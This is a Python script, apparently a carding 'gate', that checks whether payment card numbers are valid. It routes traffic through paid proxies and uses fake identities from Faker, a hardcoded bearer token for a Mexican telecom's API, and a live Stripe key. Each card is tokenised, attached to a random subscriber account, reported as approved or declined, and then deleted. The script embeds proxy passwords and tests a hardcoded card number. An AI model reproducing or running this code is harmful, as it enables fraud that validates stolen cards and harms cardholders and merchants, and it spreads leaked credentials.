import ast
import email
from email import message
from tarfile import data_filter
import random, time
import token
from faker import Faker
from random import choice
from tkinter import LAST, Tk, filedialog
from httpx import TooManyRedirects, request
import requests,re
from bs4 import BeautifulSoup as b
from bs4 import BeautifulSoup
#from hh import keep_alive
import requests
import json, string, re
import requests
import time
import json
import random, time
from faker import Faker
from random import choice
import asyncio
import requests
from bs4 import BeautifulSoup
import requests
import re
from bs4 import BeautifulSoup as b
from curl_cffi import requests
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
import json
import cloudscraper


def usuario() -> dict:
    number = random.randint(1111, 9999)
    postal = random.choice(['10080', '14925', '71601', '86556', '19980'])
    return { 'name' : Faker().name(), 'email' : Faker().email().replace('@', '{}@'.format(number)), 'username' : Faker().user_name(), 'phone' : '512678{}'.format(number), 'city' : Faker().city(), 'code' : postal }


def capture(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]

    except ValueError:
        return None

def get_random_proxy(file_path="proxys.txt"):
    with open(file_path, "r") as f:
        proxies = f.readlines()
    
    proxy = random.choice(proxies).strip()  # Elegir un proxy aleatorio
    host_port, user_pass = proxy.split("@")  # Separar IP y usuario:contraseña
    host, port = host_port.split(":")  # Separar IP y puerto
    user, password = user_pass.split(":")  # Separar usuario y contraseña
    
    return host, port, user, password
async def resolver_captcha(api_key, sitekey, url):
    data = {
        'clientKey': api_key,
        'task': {
            'type': 'NoCaptchaTaskProxyless',
            'websiteURL': url,
            'websiteKey': sitekey
        }
    }
    try:
        response = await asyncio.to_thread(requests.post, 'http://api.anti-captcha.com/createTask', json=data)
        result = response.json()

        if 'errorId' in result and result['errorId'] == 0:
            task_id = result['taskId']
            
            # Esperar a que se resuelva el captcha
            while True:
                await asyncio.sleep(5)
                response = await asyncio.to_thread(requests.post, 'http://api.anti-captcha.com/getTaskResult', json={'clientKey': api_key, 'taskId': task_id})
                if response.json()['status'] == 'ready':
                    return response.json()['solution']['gRecaptchaResponse']
        else:
            raise Exception('Error en la API de anti-captcha')

    except Exception as e:
        raise Exception(f'Error al resolver el captcha: {str(e)}')
    
def generar_numero_usa():
    area_code = random.randint(200, 999)  # NXX (sin incluir 0 o 1 como primer dígito)
    central_office_code = random.randint(200, 999)  # NXX (sin incluir 0 o 1 como primer dígito)
    line_number = random.randint(1000, 9999)  # XXXX
    
    return f"({area_code})-{central_office_code}-{line_number}"

def print_all_texts(data):
    if isinstance(data, dict):
        # Si existe una clave 'value' que contiene una lista
        if "value" in data and isinstance(data["value"], list):
            for value_item in data["value"]:
                if isinstance(value_item, dict) and "text" in value_item:
                    print(value_item["text"])
        # Continuar buscando en otros niveles
        for key, value in data.items():
            print_all_texts(value)

    elif isinstance(data, list):
        for item in data:
            print_all_texts(item)


def ccn_gate(card):
    max_retries = 15
    retry_count = 0
    while retry_count < max_retries:
        try:
            #============[Funcions Need]============#
            c =  requests.Session()
            c.proxies = {'https': 'http://ubcff417d571a05cf-zone-custom-region-us-st-newyork-city-yonkers-session-OKEZNXIYE-sessTime-5:ubcff417d571a05cf@170.106.118.114:2334'}#the proxies?http://ubcff417d571a05cf-zone-custom-region-us-st-newyork-city-yonkers-session-OKEZNXIYE-sessTime-5:ubcff417d571a05cf@170.106.118.114:2334
            

            
            proxy_url = 'http://proxy.soax.com:5000'
            proxy_user = 'package-265377-country-mx'
            proxy_pass = '589UEf1c4AXLjJ2M'

            
            
            cc_number, mes, ano_number, cvv = card.split('|')
            if len(ano_number) == 2: ano_number = "20"+ano_number
            agente_user = UserAgent()

            #============[Address Found]============#
            name  = usuario()['name'].split(' ')[0]
            last  = usuario()['name'].split(' ')[1]
            email = usuario()['email']
            number = random.randint(1111, 9999)
            street = f"{name} street {number}"
            phone = usuario()['phone']
           

            #============[Requests 1]============#
            numeros_disponibles = [
                "5635116853", "5635161652", "5635117040", "5635117578", "5635119868", "5635120199"
            ]

            elegido = random.choice(numeros_disponibles)
            print(elegido)
            
            headers = {
                'authority': 'redphone.api.koonolmexico.com',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'authorization': 'Bearer eyJhbGciOiJIUzI1NiJ9.eyJhcGlfaWQiOiJmZWNkYzcwNi1lNjVlLTQxM2YtOTI0Mi0yNTQwN2MyMTYyYzgifQ.GZlcAa4ZWFg6jRGJQJ36NjvlhUsT_UNNrNHvQyqxLGI',
                'cache-control': 'no-cache',
                'origin': 'https://micuenta.redphone.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://micuenta.redphone.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            params = {
                'msisdn': elegido,
            }

            response = c.get('https://redphone.api.koonolmexico.com/altan_services/validate', params=params, headers=headers)
            responsePm = json.loads(response.text)
            id_servicio = responsePm['altan_service']['id']
            print(id_servicio)
            

            headers = {
                'authority': 'redphone.api.koonolmexico.com',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'authorization': 'Bearer eyJhbGciOiJIUzI1NiJ9.eyJhcGlfaWQiOiJmZWNkYzcwNi1lNjVlLTQxM2YtOTI0Mi0yNTQwN2MyMTYyYzgifQ.GZlcAa4ZWFg6jRGJQJ36NjvlhUsT_UNNrNHvQyqxLGI',
                'cache-control': 'no-cache',
                'origin': 'https://micuenta.redphone.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://micuenta.redphone.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            params = {
                'primary_offering_id': '122',
                'publicly_available': 'true',
                'service_type': 'mbb',
                'interface_mask': '128',
            }

            response = c.get('https://redphone.api.koonolmexico.com/offerings', params=params, headers=headers)

            headers = {
                'authority': 'redphone.api.koonolmexico.com',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'authorization': 'Bearer eyJhbGciOiJIUzI1NiJ9.eyJhcGlfaWQiOiJmZWNkYzcwNi1lNjVlLTQxM2YtOTI0Mi0yNTQwN2MyMTYyYzgifQ.GZlcAa4ZWFg6jRGJQJ36NjvlhUsT_UNNrNHvQyqxLGI',
                'cache-control': 'no-cache',
                'origin': 'https://micuenta.redphone.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://micuenta.redphone.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            params = {
                'segment_id': '1',
                'altanServiceId': '108883',
                'publicly_available': 'true',
                'service_type': 'mbb',
                'interface_mask': '128',
                'altan_speed_limit': 'best_effort',
                'service_offer_type': 'primary',
                'offering_type': 'top_up',
                'is_multiple_activation': 'true',
            }

            response = c.get('https://redphone.api.koonolmexico.com/offerings', params=params, headers=headers)

            headers = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'accept-language': 'en-US',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'pragma': 'no-cache',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            data = f'time_on_page=274800&pasted_fields=number&guid=2953e2d9-6a1c-4c42-a83e-28bb4e237f8577fee5&muid=d51c4248-1542-438c-a89e-99aa38930d3670a15d&sid=df3ffd6e-fea6-4b25-b975-ad6ed7512f54c51c17&key=pk_live_51KOX42AMlS3RZFNSs08ALhGLqQIZ8hZLlEkBxYlxQo6aJlEcz442oQ7L9Eejs7niMHf6PKYGofk0jIMB78ubKt6D00qp0QZjLC&payment_user_agent=stripe.js%2F78ef418&card[number]={cc_number}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano_number}'

            response = c.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
            responsePm = json.loads(response.text)
           # print(responsePm)
            if 'error' in responsePm and 'message' in responsePm['error']:
                mensaje = responsePm['error']['message']
                return mensaje
            else:
                tokenkst = responsePm['id']
                print(tokenkst)
            

            headers = {
                'authority': 'redphone.api.koonolmexico.com',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'authorization': 'Bearer eyJhbGciOiJIUzI1NiJ9.eyJhcGlfaWQiOiJmZWNkYzcwNi1lNjVlLTQxM2YtOTI0Mi0yNTQwN2MyMTYyYzgifQ.GZlcAa4ZWFg6jRGJQJ36NjvlhUsT_UNNrNHvQyqxLGI',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://micuenta.redphone.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://micuenta.redphone.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            data = {
                'payment_card[card_name]': name+' '+last,
                'payment_card[card_number]': cc_number,
                'payment_card[cvv]': '631',
                'payment_card[expiry_month]': mes,
                'payment_card[expiry_year]': ano_number,
                'payment_card[is_default]': 'false',
                'payment_card[stripe_token]': tokenkst,
                'user_id': id_servicio,
            }

            response = c.post('https://redphone.api.koonolmexico.com/payment_cards', headers=headers, data=data)
            responsePm = json.loads(response.text)

            if 'message' in responsePm and 'error' in responsePm['message']:
                error_info = responsePm['message']['error']
                mensaje = error_info.get('message', 'Error desconocido')
                decline_code = error_info.get('decline_code', 'Sin código')
                estado = f"❌ Tarjeta rechazada: {mensaje} | Código: {decline_code}"

            elif 'payment_card' in responsePm and 'created_at' in responsePm['payment_card']:
                created_at = responsePm['payment_card']['created_at']
                payment_card_id = responsePm['payment_card'].get('id')
                print(payment_card_id)  # <-- Obtener ID para eliminar
                estado = f"✅ Aprobado | Creado en: {created_at}"

                # Intentar eliminar la tarjeta agregada
                if payment_card_id:
                    delete_url = f"https://redphone.api.koonolmexico.com/payment_cards/{payment_card_id}"
                    delete_response = c.delete(delete_url, headers=headers)

                    if delete_response.status_code == 200:
                        estado += " | 🧹 Tarjeta eliminada"
                    else:
                        estado += f" | ⚠️ Falló al eliminar: {delete_response.status_code}"

            else:
                estado = f"❓ Respuesta no reconocida: {responsePm}"

            print(estado)
            return estado


            


            

            
                                    
            


            
           
           

          

                    
           
            

        
            
        except Exception as e:
            print(e)
            retry_count += 1
    else:
        return {"card": card, "status": "ERROR", "resp":  f"Retries: {retry_count}"}
    

if __name__ == "__main__":
    print(ccn_gate(" 4169161450156640|05|2029|871"))